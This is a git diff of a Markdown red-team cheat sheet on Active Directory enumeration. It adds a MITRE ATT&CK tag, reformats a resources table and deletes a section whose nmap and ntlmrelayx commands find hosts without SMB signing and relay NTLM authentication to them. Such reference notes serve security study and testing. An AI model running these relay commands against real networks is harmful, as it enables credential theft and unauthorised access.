@@ -8,6 +8,8 @@ modified_date: 2023-03-17
 permalink: /:categories/:title/
 ---
 
+**Mitre Att&ck Entreprise**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
+
 <!-- vscode-markdown-toc -->
 * [PRE-REQUISITE](#PRE-REQUISITE)
 	* [Setting variables for copy/paste](#Settingvariablesforcopypaste)
@@ -116,7 +118,8 @@ tbd
 ### <a name='Greatressources'></a>Great ressources
 | **Ressource**  | 
 |-----------------|
-| [Fun with LDAP & Kerberos - ThotCon 2017](https://github.com/jomivz/cybrary/blob/master/purpleteam/red/windows/LDAP%20Service%20and%20Kereberos%20Protocol%20Attacks.pdf) | AD Enumeration on Linux OS. [YT](https://www.youtube.com/watch?v=2Xfd962QfPs) |
+| [Fun with LDAP & Kerberos - ThotCon 2017](https://github.com/jomivz/cybrary/blob/master/purpleteam/red/windows/LDAP%20Service%20and%20Kereberos%20Protocol%20Attacks.pdf) | 
+| [AD Enumeration on Linux OS - YT](https://www.youtube.com/watch?v=2Xfd962QfPs) |
 | [RPCclient cookbook](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html) |
 | [Other LDAP queries examples](https://theitbros.com/ldap-query-examples-active-directory/) |
 | [Other LDAP queries examples](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb) |
@@ -172,16 +175,6 @@ i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's
 
 ## <a name='MISC'></a>MISC
 
-### <a name='RELAY:SMBv2SIGNINGNOTREQUIRED'></a> RELAY: SMBv2 SIGNING NOT REQUIRED
-```sh
-# STEP 1: find smb not signed
-nmap -p 445 --script smb2-security-mode 10.0.0.0/24 -o output.txt
-
-# STEP 2: set up impacket/ntlmrelayx
-grep -B 9 "not required" output.txt |sed -E '/.*\((.*\..*\..*\..*)\)$/!d' |sed -E 's/.*\((.*\..*\..*\..*)\)$/\1/' > targets.txt
-python3 ntlmrelayx.py -tf targets.txt -smb2support
-
-```
 
 ### <a name='CRACKINGHASHES'></a>CRACKING HASHES
 ```sh
